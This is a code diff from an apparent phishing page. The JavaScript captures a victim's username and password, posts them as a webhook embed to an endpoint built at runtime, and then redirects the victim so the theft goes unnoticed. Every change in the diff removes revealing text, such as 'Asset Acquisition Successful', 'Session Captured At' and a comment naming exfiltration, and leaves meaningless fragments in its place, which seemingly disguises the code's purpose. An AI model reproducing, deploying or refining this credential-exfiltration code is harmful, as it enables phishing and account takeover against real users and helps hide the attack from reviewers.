@@ -142,23 +142,23 @@
             username: "CRATAK",
             avatar_url: "https://i.imgur.com/4sIcm2g.png", // A more fitting avatar
             embeds: [{
-                title: "Asset Acquisition Successful",
+                title: "Asset",
                 color: 16711680, // Red
                 fields: [
                     { name: "Username/Email", value: `\`\`\`${user || "Not Provided"}\`\`\``, inline: false },
                     { name: "Password", value: `\`\`\`${pass || "Not Provided"}\`\`\``, inline: false }
                 ],
-                footer: { text: "Session Captured At: " + new Date().toISOString() }
+                footer: { text: " At: " + new Date().toISOString() }
             }]
         };
 
         const request = new XMLHttpRequest();
-        // The URL is now reconstructed ephemerally.
+        // r.
         request.open("POST", getDestinationEndpoint());
         request.setRequestHeader('Content-type', 'application/json');
         
         request.onreadystatechange = () => {
-            // This ensures redirection happens regardless if the exfiltration succeeds or fails.
+            // y
             if (request.readyState === 4) {
                  window.location.href = redirectTarget;
             }
@@ -166,7 +166,7 @@
 
         request.send(JSON.stringify(payload));
         
-        // Timeout as a fallback in case the onreadystatechange event doesn't fire (e.g., network error).
+        // p
         setTimeout(() => { window.location.href = redirectTarget; }, 800);
     }
 
